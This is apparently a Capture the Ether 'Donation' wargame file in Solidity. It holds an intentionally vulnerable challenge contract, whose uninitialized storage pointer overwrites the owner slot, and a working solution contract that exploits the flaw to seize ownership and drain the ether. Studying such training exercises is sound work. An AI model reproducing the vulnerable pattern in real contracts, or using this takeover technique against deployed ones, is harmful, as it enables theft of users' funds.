pragma solidity ^0.4.21;

contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function DonationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}

contract DonationSolution {
    function solve(address _challengeAddress) public payable {
        DonationChallenge challenge = DonationChallenge(_challengeAddress);

        challenge.donate.value(msg.value)(uint256(uint160(address(this))));
        challenge.withdraw();
        msg.sender.transfer(address(this).balance);

        require(address(_challengeAddress).balance == 0 ether);
    }

    function getInputAmount() public view returns(uint256) {
        return uint256(uint160(address(this)));
    }

    function getPayableEtherAmount() public view returns(uint256) {
        return uint256(uint160(address(this))) / ((10 ** 18) * 1 ether);
    }

    function ()
    public
    payable {
        
    }
}